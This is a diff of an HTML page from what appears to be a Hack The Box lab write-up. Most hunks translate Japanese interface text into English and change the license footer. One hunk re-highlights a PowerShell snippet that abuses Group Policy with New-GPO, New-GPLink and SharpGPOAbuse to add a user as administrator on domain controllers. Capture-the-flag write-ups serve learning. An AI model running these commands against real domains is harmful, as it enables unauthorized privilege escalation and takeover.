@@ -151,7 +151,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -353,7 +353,7 @@
             </figure>
 
 <h2 id="gpo-abuse"><a href="#gpo-abuse" class="headerlink" title="gpo abuse"></a>gpo abuse</h2><p>创建一个gpo，添加自己到域管：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有自动清理，快速操作</span></span><br><span class="line">New-GPO -Name <span class="string">"miao"</span></span><br><span class="line">New-GPLink -Name <span class="string">"miao"</span> -Target <span class="string">"OU=Domain Controllers,DC=frizz,DC=htb"</span></span><br><span class="line">.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName miao</span><br><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有自动清理，快速操作</span></span><br><span class="line"><span class="built_in">New-GPO</span> <span class="literal">-Name</span> <span class="string">"miao"</span></span><br><span class="line"><span class="built_in">New-GPLink</span> <span class="literal">-Name</span> <span class="string">"miao"</span> <span class="literal">-Target</span> <span class="string">"OU=Domain Controllers,DC=frizz,DC=htb"</span></span><br><span class="line">.\SharpGPOAbuse.exe -<span class="literal">-AddLocalAdmin</span> -<span class="literal">-UserAccount</span> M.SchoolBus -<span class="literal">-GPOName</span> miao</span><br><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>gpo刷新后退出重新登录，现在我们是管理员：</p>
 <figure class="image-bubble">
@@ -381,7 +381,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2025-08-30T03:50:00.707Z" itemprop="dateUpdated">2025-08-30 11:50:00</time>
+    Last updated: <time datetime="2025-08-30T03:50:00.707Z" itemprop="dateUpdated">2025-08-30 11:50:00</time>
 </span><br>
 
 
@@ -548,7 +548,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
